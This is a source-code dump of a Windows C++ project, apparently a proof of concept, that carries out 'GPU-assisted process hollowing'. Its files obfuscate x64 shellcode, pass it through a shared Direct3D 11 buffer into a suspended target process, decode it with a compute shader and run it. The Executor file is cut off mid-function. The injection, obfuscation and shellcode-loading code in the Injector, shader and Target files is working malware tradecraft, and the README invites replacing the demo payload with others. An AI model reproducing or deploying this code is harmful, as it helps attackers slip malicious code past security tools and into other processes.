@@ -1,0 +1,1563 @@
+Project Path: arc_a0yark_DXInject-UC_cenxj5tz
+
+Source Tree:
+
+```txt
+arc_a0yark_DXInject-UC_cenxj5tz
+├── Common
+│   └── SharedStructures.h
+├── DXInject.sln
+├── Injector
+│   ├── GPUPayloadTransport.cpp
+│   ├── GPUPayloadTransport.h
+│   ├── Injector.vcxproj
+│   ├── Main.cpp
+│   ├── ProcessManager.cpp
+│   ├── ProcessManager.h
+│   └── Shellcode.h
+├── README.md
+├── Shaders
+│   ├── DecodePayload.cso
+│   └── DecodePayload.hlsl
+└── Target
+    ├── Executor.cpp
+    ├── Executor.h
+    ├── GPULoader.cpp
+    ├── GPULoader.h
+    ├── Target.vcxproj
+    └── TargetWindow.cpp
+
+```
+
+`Common/SharedStructures.h`:
+
+```h
+#pragma once
+#include <windows.h>
+#include <cstdint>
+
+namespace GPUInject {
+
+constexpr uint32_t MAX_PAYLOAD_SIZE = 65536;
+constexpr uint32_t DECODE_THREAD_GROUP_SIZE = 256;
+
+constexpr wchar_t PAYLOAD_READY_EVENT[] = L"Local\\GPUInject_PayloadReady";
+constexpr wchar_t DECODE_COMPLETE_EVENT[] = L"Local\\GPUInject_DecodeComplete";
+constexpr wchar_t EXECUTION_COMPLETE_EVENT[] = L"Local\\GPUInject_ExecutionComplete";
+constexpr wchar_t SHARED_MEMORY_NAME[] = L"Local\\GPUInject_SharedMemory";
+
+struct SharedGPUData {
+    HANDLE encodedBufferHandle;
+    uint32_t payloadSize;
+    uint32_t encodeKey;
+    uint32_t reserved;
+};
+
+struct PayloadChunk {
+    uint32_t data;
+};
+
+}
+
+```
+
+`DXInject.sln`:
+
+```sln
+
+Microsoft Visual Studio Solution File, Format Version 12.00
+# Visual Studio Version 17
+VisualStudioVersion = 17.0.31903.59
+MinimumVisualStudioVersion = 10.0.40219.1
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Injector", "Injector\Injector.vcxproj", "{A7C8F7E1-4D3A-4B5C-9F2E-1A2B3C4D5E6F}"
+EndProject
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Target", "Target\Target.vcxproj", "{B8D9E8F2-5E4B-5C6D-A03F-2B3C4D5E6F70}"
+EndProject
+Global
+	GlobalSection(SolutionConfigurationPlatforms) = preSolution
+		Debug|x64 = Debug|x64
+		Release|x64 = Release|x64
+	EndGlobalSection
+	GlobalSection(ProjectConfigurationPlatforms) = postSolution
+		{A7C8F7E1-4D3A-4B5C-9F2E-1A2B3C4D5E6F}.Debug|x64.ActiveCfg = Debug|x64
+		{A7C8F7E1-4D3A-4B5C-9F2E-1A2B3C4D5E6F}.Debug|x64.Build.0 = Debug|x64
+		{A7C8F7E1-4D3A-4B5C-9F2E-1A2B3C4D5E6F}.Release|x64.ActiveCfg = Release|x64
+		{A7C8F7E1-4D3A-4B5C-9F2E-1A2B3C4D5E6F}.Release|x64.Build.0 = Release|x64
+		{B8D9E8F2-5E4B-5C6D-A03F-2B3C4D5E6F70}.Debug|x64.ActiveCfg = Debug|x64
+		{B8D9E8F2-5E4B-5C6D-A03F-2B3C4D5E6F70}.Debug|x64.Build.0 = Debug|x64
+		{B8D9E8F2-5E4B-5C6D-A03F-2B3C4D5E6F70}.Release|x64.ActiveCfg = Release|x64
+		{B8D9E8F2-5E4B-5C6D-A03F-2B3C4D5E6F70}.Release|x64.Build.0 = Release|x64
+	EndGlobalSection
+	GlobalSection(SolutionProperties) = preSolution
+		HideSolutionNode = FALSE
+	EndGlobalSection
+EndGlobal
+
+```
+
+`Injector/GPUPayloadTransport.cpp`:
+
+```cpp
+#include "GPUPayloadTransport.h"
+#include "SharedStructures.h"
+#include <iostream>
+
+GPUPayloadTransport::GPUPayloadTransport()
+    : device(nullptr)
+    , context(nullptr)
+    , encodedBuffer(nullptr)
+    , sharedBufferHandle(nullptr)
+    , payloadSize(0)
+    , encodeKey(0)
+{
+}
+
+GPUPayloadTransport::~GPUPayloadTransport() {
+    cleanup();
+}
+
+bool GPUPayloadTransport::initialize() {
+    D3D_FEATURE_LEVEL featureLevel;
+    UINT createFlags = 0;
+
+#ifdef _DEBUG
+    createFlags |= D3D11_CREATE_DEVICE_DEBUG;
+#endif
+
+    HRESULT hr = D3D11CreateDevice(
+        nullptr,
+        D3D_DRIVER_TYPE_HARDWARE,
+        nullptr,
+        createFlags,
+        nullptr,
+        0,
+        D3D11_SDK_VERSION,
+        &device,
+        &featureLevel,
+        &context
+    );
+
+    if (FAILED(hr)) {
+        std::cerr << "failed to create d3d11 device\n";
+        return false;
+    }
+
+    return true;
+}
+
+std::vector<uint32_t> GPUPayloadTransport::encodePayload(const uint8_t* payload, uint32_t size, uint32_t key) {
+    uint32_t dwordCount = (size + 3) / 4;
+    std::vector<uint32_t> encoded(dwordCount, 0);
+
+    // 将任意长度字节流打包成 dword，方便 GPU 端按 uint 读取。
+    for (uint32_t i = 0; i < size; i++) {
+        uint32_t dwordIndex = i / 4;
+        uint32_t byteOffset = i % 4;
+        encoded[dwordIndex] |= (static_cast<uint32_t>(payload[i]) << (byteOffset * 8));
+    }
+
+    // 位置相关的 XOR + 旋转提供轻量混淆，Target 端用 compute shader 逆运算。
+    for (uint32_t i = 0; i < dwordCount; i++) {
+        uint32_t value = encoded[i];
+
+        uint32_t posKey = key ^ (i * 0x9E3779B9);
+        value ^= posKey;
+
+        uint32_t rollingKey = (key + i) * 0x45D9F3B;
+        value ^= rollingKey;
+
+        uint32_t rotateAmount = (i & 31);
+        if (rotateAmount == 0)
+            encoded[i] = value;
+        else
+            encoded[i] = (value >> rotateAmount) | (value << (32 - rotateAmount));
+    }
+
+    return encoded;
+}
+
+bool GPUPayloadTransport::encodeAndUploadPayload(const uint8_t* payload, uint32_t size, uint32_t key) {
+    if (size > GPUInject::MAX_PAYLOAD_SIZE) {
+        std::cerr << "payload too large\n";
+        return false;
+    }
+
+    this->payloadSize = size;
+    this->encodeKey = key;
+
+    std::vector<uint32_t> encoded = encodePayload(payload, size, key);
+
+    D3D11_BUFFER_DESC bufferDesc = {};
+    bufferDesc.ByteWidth = static_cast<UINT>(encoded.size() * sizeof(uint32_t));
+    bufferDesc.Usage = D3D11_USAGE_DEFAULT;
+    bufferDesc.BindFlags = D3D11_BIND_SHADER_RESOURCE;
+    bufferDesc.CPUAccessFlags = 0;
+    bufferDesc.MiscFlags = D3D11_RESOURCE_MISC_SHARED_KEYEDMUTEX | D3D11_RESOURCE_MISC_BUFFER_STRUCTURED;
+    bufferDesc.StructureByteStride = sizeof(uint32_t);
+
+    D3D11_SUBRESOURCE_DATA initData = {};
+    initData.pSysMem = encoded.data();
+
+    // 创建可共享的结构化缓冲区，填充编码后的数据。
+    HRESULT hr = device->CreateBuffer(&bufferDesc, &initData, &encodedBuffer);
+    if (FAILED(hr)) {
+        std::cerr << "failed to create gpu buffer\n";
+        return false;
+    }
+
+    context->Flush();
+
+    IDXGIResource* dxgiResource = nullptr;
+    hr = encodedBuffer->QueryInterface(__uuidof(IDXGIResource), (void**)&dxgiResource);
+    if (FAILED(hr)) {
+        std::cerr << "failed to query dxgi interface\n";
+        return false;
+    }
+
+    // 将资源转换成跨进程可传递的共享句柄，写入共享内存供 Target 打开。
+    hr = dxgiResource->GetSharedHandle(&sharedBufferHandle);
+    dxgiResource->Release();
+
+    if (FAILED(hr)) {
+        std::cerr << "failed to get shared handle\n";
+        return false;
+    }
+
+    // 提前释放 Keyed Mutex，确保目标进程能够 Acquire。
+    IDXGIKeyedMutex* keyedMutex = nullptr;
+    hr = encodedBuffer->QueryInterface(__uuidof(IDXGIKeyedMutex), (void**)&keyedMutex);
+    if (SUCCEEDED(hr)) {
+        keyedMutex->ReleaseSync(0);
+        keyedMutex->Release();
+    }
+
+    return true;
+}
+
+void GPUPayloadTransport::cleanup() {
+    if (encodedBuffer) {
+        encodedBuffer->Release();
+        encodedBuffer = nullptr;
+    }
+    if (context) {
+        context->Release();
+        context = nullptr;
+    }
+    if (device) {
+        device->Release();
+        device = nullptr;
+    }
+}
+
+```
+
+`Injector/GPUPayloadTransport.h`:
+
+```h
+#pragma once
+#include <d3d11.h>
+#include <dxgi.h>
+#include <cstdint>
+#include <vector>
+
+class GPUPayloadTransport {
+public:
+    GPUPayloadTransport();
+    ~GPUPayloadTransport();
+
+    bool initialize();
+    bool encodeAndUploadPayload(const uint8_t* payload, uint32_t size, uint32_t encodeKey);
+    HANDLE getSharedBufferHandle() const { return sharedBufferHandle; }
+    uint32_t getPayloadSize() const { return payloadSize; }
+    void cleanup();
+
+private:
+    ID3D11Device* device;
+    ID3D11DeviceContext* context;
+    ID3D11Buffer* encodedBuffer;
+    HANDLE sharedBufferHandle;
+    uint32_t payloadSize;
+    uint32_t encodeKey;
+
+    std::vector<uint32_t> encodePayload(const uint8_t* payload, uint32_t size, uint32_t key);
+};
+
+```
+
+`Injector/Injector.vcxproj`:
+
+```vcxproj
+<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>17.0</VCProjectVersion>
+    <ProjectGuid>{A7C8F7E1-4D3A-4B5C-9F2E-1A2B3C4D5E6F}</ProjectGuid>
+    <Keyword>Win32Proj</Keyword>
+    <RootNamespace>Injector</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <LinkIncremental>true</LinkIncremental>
+    <OutDir>$(SolutionDir)bin\$(Configuration)\</OutDir>
+    <IntDir>$(SolutionDir)obj\$(ProjectName)\$(Configuration)\</IntDir>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <LinkIncremental>false</LinkIncremental>
+    <OutDir>$(SolutionDir)bin\$(Configuration)\</OutDir>
+    <IntDir>$(SolutionDir)obj\$(ProjectName)\$(Configuration)\</IntDir>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+      <AdditionalIncludeDirectories>$(SolutionDir)Common;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>d3d11.lib;dxgi.lib;d3dcompiler.lib;%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+      <LanguageStandard>stdcpp17</LanguageStandard>
+      <AdditionalIncludeDirectories>$(SolutionDir)Common;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>d3d11.lib;dxgi.lib;d3dcompiler.lib;%(AdditionalDependencies)</AdditionalDependencies>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="Main.cpp" />
+    <ClCompile Include="GPUPayloadTransport.cpp" />
+    <ClCompile Include="ProcessManager.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="GPUPayloadTransport.h" />
+    <ClInclude Include="ProcessManager.h" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+</Project>
+
+```
+
+`Injector/Main.cpp`:
+
+```cpp
+#include "GPUPayloadTransport.h"
+#include "ProcessManager.h"
+#include "Shellcode.h"
+#include "SharedStructures.h"
+#include <iostream>
+#include <filesystem>
+#include <random>
+
+HANDLE createEvent(const wchar_t* name) {
+    // All GPU sync events share the same creation flags, keep construction centralized.
+    return CreateEventW(nullptr, TRUE, FALSE, name);
+}
+
+int main() {
+    std::cout << "[injector] gpu process hollowing poc\n";
+
+    // Target.exe 默认与 Injector 放在同目录，方便 PoC 演示。
+    std::filesystem::path targetPath = std::filesystem::current_path() / "Target.exe";
+    if (!std::filesystem::exists(targetPath)) {
+        std::cerr << "[injector] target.exe not found\n";
+        return 1;
+    }
+
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<uint32_t> dis(0, UINT32_MAX);
+    // 生成一次性编码密钥，避免共享缓冲区中出现明文。
+    uint32_t encodeKey = dis(gen);
+
+    HANDLE payloadReadyEvent = createEvent(GPUInject::PAYLOAD_READY_EVENT);
+    HANDLE decodeCompleteEvent = createEvent(GPUInject::DECODE_COMPLETE_EVENT);
+    HANDLE executionCompleteEvent = createEvent(GPUInject::EXECUTION_COMPLETE_EVENT);
+
+    if (!payloadReadyEvent || !decodeCompleteEvent || !executionCompleteEvent) {
+        std::cerr << "[injector] failed to create sync events\n";
+        return 1;
+    }
+
+    GPUPayloadTransport transport;
+    if (!transport.initialize()) {
+        std::cerr << "[injector] failed to initialize gpu transport\n";
+        return 1;
+    }
+
+    std::cout << "[injector] encoding payload on cpu\n";
+    uint8_t* payload = Shellcode::messageBoxPayload;
+    uint32_t payloadSize = Shellcode::messageBoxPayloadSize;
+
+    if (!transport.encodeAndUploadPayload(payload, payloadSize, encodeKey)) {
+        std::cerr << "[injector] failed to upload payload\n";
+        return 1;
+    }
+
+    std::cout << "[injector] spawning target process (pid: ";
+    ProcessManager procMgr;
+    if (!procMgr.createSuspendedTarget(targetPath.wstring())) {
+        std::cerr << "[injector] failed to create target\n";
+        return 1;
+    }
+
+    std::cout << procMgr.getTargetPID() << ")\n";
+
+    if (!procMgr.writeSharedGPUData(transport.getSharedBufferHandle(), payloadSize, encodeKey)) {
+        std::cerr << "[injector] failed to write shared data\n";
+        return 1;
+    }
+
+    if (!procMgr.resumeTarget()) {
+        std::cerr << "[injector] failed to resume target\n";
+        return 1;
+    }
+
+    SetEvent(payloadReadyEvent);
+
+    // 与 Target 线程握手：等待 GPU 解码完成，再等待 shellcode 执行结束。
+    std::cout << "[injector] waiting for gpu decode\n";
+    WaitForSingleObject(decodeCompleteEvent, INFINITE);
+
+    std::cout << "[injector] waiting for execution\n";
+    WaitForSingleObject(executionCompleteEvent, 10000);
+
+    std::cout << "[injector] injection complete\n";
+
+    CloseHandle(payloadReadyEvent);
+    CloseHandle(decodeCompleteEvent);
+    CloseHandle(executionCompleteEvent);
+
+    return 0;
+}
+
+```
+
+`Injector/ProcessManager.cpp`:
+
+```cpp
+#include "ProcessManager.h"
+#include "SharedStructures.h"
+#include <iostream>
+
+ProcessManager::ProcessManager()
+    : sharedMemory(nullptr)
+    , isCreated(false)
+{
+    ZeroMemory(&processInfo, sizeof(processInfo));
+}
+
+ProcessManager::~ProcessManager() {
+    terminate();
+}
+
+bool ProcessManager::createSuspendedTarget(const std::wstring& targetPath) {
+    STARTUPINFOW startupInfo = {};
+    startupInfo.cb = sizeof(startupInfo);
+
+    std::wstring cmdLine = targetPath;
+
+    BOOL success = CreateProcessW(
+        nullptr,
+        &cmdLine[0],
+        nullptr,
+        nullptr,
+        FALSE,
+        CREATE_SUSPENDED,
+        nullptr,
+        nullptr,
+        &startupInfo,
+        &processInfo
+    );
+
+    if (!success) {
+        std::cerr << "failed to create target process\n";
+        return false;
+    }
+
+    isCreated = true;
+    return true;
+}
+
+bool ProcessManager::createSharedMemoryMapping(HANDLE bufferHandle, uint32_t payloadSize, uint32_t encodeKey) {
+    // 使用具名共享内存承载 DXGI 共享句柄和元数据，便于目标进程读取。
+    sharedMemory = CreateFileMappingW(
+        INVALID_HANDLE_VALUE,
+        nullptr,
+        PAGE_READWRITE,
+        0,
+        sizeof(GPUInject::SharedGPUData),
+        GPUInject::SHARED_MEMORY_NAME
+    );
+
+    if (!sharedMemory) {
+        std::cerr << "failed to create shared memory\n";
+        return false;
+    }
+
+    void* mappedView = MapViewOfFile(
+        sharedMemory,
+        FILE_MAP_ALL_ACCESS,
+        0,
+        0,
+        sizeof(GPUInject::SharedGPUData)
+    );
+
+    if (!mappedView) {
+        std::cerr << "failed to map view of file\n";
+        return false;
+    }
+
+    GPUInject::SharedGPUData* sharedData = static_cast<GPUInject::SharedGPUData*>(mappedView);
+    sharedData->encodedBufferHandle = bufferHandle;
+    sharedData->payloadSize = payloadSize;
+    sharedData->encodeKey = encodeKey;
+    sharedData->reserved = 0;
+
+    UnmapViewOfFile(mappedView);
+    return true;
+}
+
+bool ProcessManager::writeSharedGPUData(HANDLE bufferHandle, uint32_t payloadSize, uint32_t encodeKey) {
+    return createSharedMemoryMapping(bufferHandle, payloadSize, encodeKey);
+}
+
+bool ProcessManager::injectInitializationCode() {
+    return true;
+}
+
+bool ProcessManager::resumeTarget() {
+    if (!isCreated) {
+        return false;
+    }
+
+    // 目标在挂起状态完成共享数据写入后再恢复，避免竞态。
+    DWORD result = ResumeThread(processInfo.hThread);
+    if (result == (DWORD)-1) {
+        std::cerr << "failed to resume thread\n";
+        return false;
+    }
+
+    return true;
+}
+
+void ProcessManager::terminate() {
+    if (sharedMemory) {
+        CloseHandle(sharedMemory);
+        sharedMemory = nullptr;
+    }
+
+    if (isCreated) {
+        if (processInfo.hThread) {
+            CloseHandle(processInfo.hThread);
+        }
+        if (processInfo.hProcess) {
+            CloseHandle(processInfo.hProcess);
+        }
+        isCreated = false;
+    }
+}
+
+```
+
+`Injector/ProcessManager.h`:
+
+```h
+#pragma once
+#include <windows.h>
+#include <string>
+
+class ProcessManager {
+public:
+    ProcessManager();
+    ~ProcessManager();
+
+    bool createSuspendedTarget(const std::wstring& targetPath);
+    bool writeSharedGPUData(HANDLE bufferHandle, uint32_t payloadSize, uint32_t encodeKey);
+    bool injectInitializationCode();
+    bool resumeTarget();
+    void terminate();
+
+    DWORD getTargetPID() const { return processInfo.dwProcessId; }
+
+private:
+    PROCESS_INFORMATION processInfo;
+    HANDLE sharedMemory;
+    bool isCreated;
+
+    bool createSharedMemoryMapping(HANDLE bufferHandle, uint32_t payloadSize, uint32_t encodeKey);
+};
+
+```
+
+`Injector/Shellcode.h`:
+
+```h
+#pragma once
+#include <cstdint>
+
+namespace Shellcode {
+
+// 简单 MessageBox PoC shellcode，Target 端会在运行前动态修补 API 地址。
+inline uint8_t messageBoxPayload[] = {
+    0x48, 0x83, 0xEC, 0x28,
+    0x48, 0x31, 0xC9,
+    0x48, 0x8D, 0x15, 0x29, 0x00, 0x00, 0x00,
+    0x4C, 0x8D, 0x05, 0x1E, 0x00, 0x00, 0x00,
+    0x4D, 0x31, 0xC9,
+    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xFF, 0xD0,
+    0x48, 0x31, 0xC9,
+    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xFF, 0xD0,
+
+    'P', 'O', 'C', 0x00,
+    'G', 'P', 'U', ' ', 'I', 'n', 'j', 'e', 'c', 't', 'e', 'd', '!', 0x00
+};
+
+constexpr uint32_t messageBoxPayloadSize = sizeof(messageBoxPayload);
+
+inline void patchAddresses(uint8_t* payload, void* messageBoxAddr, void* exitThreadAddr) {
+    uint64_t msgBoxAddr = reinterpret_cast<uint64_t>(messageBoxAddr);
+    // 将 MessageBoxA 绝对地址写回 shellcode 字节流（小端）。
+    for (int i = 0; i < 8; i++) {
+        payload[20 + i] = static_cast<uint8_t>((msgBoxAddr >> (i * 8)) & 0xFF);
+    }
+
+    uint64_t exitAddr = reinterpret_cast<uint64_t>(exitThreadAddr);
+    // 同理写入 ExitThread，用于在执行结束时退出线程。
+    for (int i = 0; i < 8; i++) {
+        payload[31 + i] = static_cast<uint8_t>((exitAddr >> (i * 8)) & 0xFF);
+    }
+}
+
+}
+
+```
+
+`README.md`:
+
+```md
+# DXInject-UC
+
+DXInject-UC 是一个基于 DirectX 11 的 GPU 载荷传输与解码样例，演示如何借助显卡共享缓冲区、计算着色器和跨进程同步原语，实现“显卡协助的进程空洞化”（GPU-assisted process hollowing）。项目由 `Injector`（负责编码/上传 Shellcode）与 `Target`（负责从显卡解码并执行 Shellcode）两个可执行文件构成，配合共享内存与事件进行通信。
+
+> ⚠️ **仅限研究用途**：本仓库用于学习 GPU 资源共享、同步与安全研究，请勿在未授权环境中运行。
+
+## 功能亮点
+
+- **显存载荷传输**：`Injector` 通过 `ID3D11Buffer` 创建共享缓冲区，并将编码后的载荷上传至 GPU（`Injector/GPUPayloadTransport.cpp`）。
+- **计算着色器解码**：`Target` 使用 `Shaders/DecodePayload.hlsl` 计算着色器在 GPU 侧快速解码，再回读到 CPU。
+- **跨进程同步**：双方通过具名事件和共享内存（`Common/SharedStructures.h`）交换 DXGI 共享句柄、载荷大小以及编码密钥。
+- **动态 Shellcode 修补与执行**：`Target` 在执行前动态解析 `MessageBoxA` / `ExitThread` 地址并写入解码后的 Shellcode（`Target/Executor.cpp`）。
+
+## 目录结构
+
+| 目录/文件 | 说明 |
+| --- | --- |
+| `DXInject.sln` | Visual Studio 解决方案，包含 Injector 与 Target 工程 |
+| `Common/SharedStructures.h` | 跨进程共用的同步对象名称、共享结构体定义 |
+| `Injector/` | 注入端：GPU 载荷编码、事件创建、目标进程管理 |
+| `Target/` | 目标端：窗口壳、GPU 解码器与 Shellcode 执行器 |
+| `Shaders/DecodePayload.*` | 负责解码的 HLSL 计算着色器与已编译 `.cso` |
+
+## 技术栈
+
+- C++17 / Win32 API / Visual Studio 2019+
+- Direct3D 11（设备、资源共享、计算着色器）
+- DXGI 共享句柄、Keyed Mutex 同步
+- HLSL 计算着色器 (`cs_5_0`)
+
+## 构建要求
+
+1. Windows 10/11 x64，启用 GPU 驱动并支持 Direct3D 11。
+2. Visual Studio 2019 或 2022（带 Desktop development with C++ workload）。
+3. Windows 10 SDK（含 `fxc.exe` 或安装最新版 `dxc.exe` 用于编译着色器）。
+4. 将 `Target.exe` 与 `Injector.exe` 置于同一目录，或调整 `Injector/Main.cpp` 中的路径逻辑。
+
+## 快速开始
+
+1. **获取源码**：`git clone` 仓库并同步子模块（如有）。
+2. **编译着色器**（推荐放在 `Shaders` 目录执行）：
+   ```bash
+   fxc /nologo /T cs_5_0 /E DecodePayloadCS /Fo DecodePayload.cso DecodePayload.hlsl
+   ```
+   或
+   ```bash
+   dxc -T cs_6_0 -E DecodePayloadCS -Fo DecodePayload.cso DecodePayload.hlsl
+   ```
+3. **打开解决方案**：使用 Visual Studio 打开 `DXInject.sln`，选择 `x64` 配置并分别构建 `Injector`、`Target`。
+4. **部署**：确保 `Target.exe`、`Injector.exe` 以及 `Shaders/DecodePayload.cso` 位于 VS 生成的输出目录（默认 `x64/Debug` 或 `x64/Release`）。
+5. **运行 Demo**：
+   - 手动启动 `Target.exe`，或让 `Injector` 创建目标进程（默认从当前目录查找 `Target.exe`）。
+   - 执行 `Injector.exe`，观察控制台输出及目标窗口弹出的消息框。
+
+## 工作流程概览
+
+```
+Shellcode
+   │（编码 + 加密，CPU）
+   ▼
+Injector.exe ──共享句柄/元数据──► Shared Memory + Events
+   │                                     ▲
+   │（共享 ID3D11Buffer）                │
+   └─────────────────────────────────────┘
+Target.exe ──GPU Decode (Compute Shader)─► CPU Payload ──► Executor (CreateThread)
+```
+
+1. `Injector` 将 Shellcode 打包为 `uint32_t` 数组并施加位置相关的异或与旋转混淆。
+2. 通过 `ID3D11Buffer` + `IDXGIResource::GetSharedHandle` 获取可跨进程共享的句柄，并写入共享内存。
+3. `Target` 读取句柄、payload 大小与密钥，使自身设备打开同一块显存，随后绑定 `DecodePayloadCS` 计算着色器执行逆向运算。
+4. 解码数据被复制到 staging buffer，再映射回系统内存交由 `Executor` 分配 RWX 内存并运行。
+5. 双方通过 `Local\GPUInject_*` 事件实现 Payload 准备、解码完成与执行完成的握手。
+
+## 核心模块
+
+- **GPUPayloadTransport**（`Injector/GPUPayloadTransport.*`）：负责初始化 D3D11 设备、编码 Shellcode 并创建带共享句柄的结构化缓冲区。
+- **ProcessManager**（`Injector/ProcessManager.*`）：负责创建挂起的目标进程、写入共享内存并恢复主线程。
+- **GPULoader**（`Target/GPULoader.*`）：在目标进程中打开共享缓冲区，配置 SRV/UAV、常量缓冲，调度计算着色器并将结果复制回 CPU。
+- **Executor**（`Target/Executor.*`）：将解码结果修补 API 地址后写入 RWX 内存，并创建线程执行。
+- **Shellcode**（`Injector/Shellcode.h`）：示例载荷，展示地址修补方式以及成功后的弹窗字符串。
+
+## 同步原语与数据结构
+
+| 名称 | 类型 | 作用 |
+| --- | --- | --- |
+| `Local\GPUInject_PayloadReady` | 事件 | `Injector` 上传完成后置位，提示 `Target` 可以读取共享数据 |
+| `Local\GPUInject_DecodeComplete` | 事件 | `Target` 解码完毕后通知 `Injector` |
+| `Local\GPUInject_ExecutionComplete` | 事件 | Shellcode 执行结束通知 `Injector` |
+| `SharedGPUData` | 共享内存结构 | 保存共享缓冲区句柄、载荷大小和编码密钥 |
+
+## 常见问题 / 限制
+
+- **仅支持 Windows + D3D11**：若 GPU/驱动不满足 D3D11 要求，`D3D11CreateDevice` 会失败。
+- **未实现完整错误处理**：代码以 PoC 为主，真实场景需补充异常路径、日志与安全检查。
+- **Shellcode 示例较简单**：目前只演示 `MessageBoxA`，需要自行替换更复杂的载荷。
+- **未对显卡同步进行健壮封装**：高并发或不同权限级别的进程可能需要 Keyed Mutex 更严谨的 acquire/release。
+
+## 研究/法律声明
+
+本项目仅用于学习 GPU 资源共享、跨进程同步与安全研究技巧。请遵守当地法律法规，在授权的、可控的环境中运行和测试；作者与维护者不对任何滥用行为负责。
+
+```
+
+`Shaders/DecodePayload.hlsl`:
+
+```hlsl
+StructuredBuffer<uint> encodedPayload : register(t0);
+RWStructuredBuffer<uint> decodedPayload : register(u0);
+
+cbuffer DecodeParams : register(b0)
+{
+    uint payloadSizeInDwords;
+    uint encodeKey;
+    uint2 padding;
+};
+
+[numthreads(256, 1, 1)]
+void DecodePayloadCS(uint3 dispatchThreadId : SV_DispatchThreadID)
+{
+    uint index = dispatchThreadId.x;
+
+    if (index >= payloadSizeInDwords)
+        return;
+
+    uint encoded = encodedPayload[index];
+
+    uint rotateAmount = (index & 31);
+    uint rotated;
+    if (rotateAmount == 0)
+        rotated = encoded;
+    else
+        rotated = (encoded << rotateAmount) | (encoded >> (32 - rotateAmount));
+
+    uint rollingKey = (encodeKey + index) * 0x45D9F3B;
+    rotated ^= rollingKey;
+
+    uint posKey = encodeKey ^ (index * 0x9E3779B9);
+    uint decoded = rotated ^ posKey;
+
+    decodedPayload[index] = decoded;
+}
+
+```
+
+`Target/Executor.cpp`:
+
+```cpp
+#include "Executor.h"
+#include <iostream>
+
+Executor::Executor()
+    : allocatedMemory(nullptr)
+    , allocatedSize(0)
+{
+}
+
+Executor::~Executor() {
+    if (allocatedMemory) {
+        VirtualFree(allocatedMemory, 0, MEM_RELEASE);
+    }
+}
+
+void Executor::patchShellcodeAddresses(std::vector<uint8_t>& shellcode) {
+    HMODULE user32 = GetModuleHandleA("user32.dll");
+    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
+
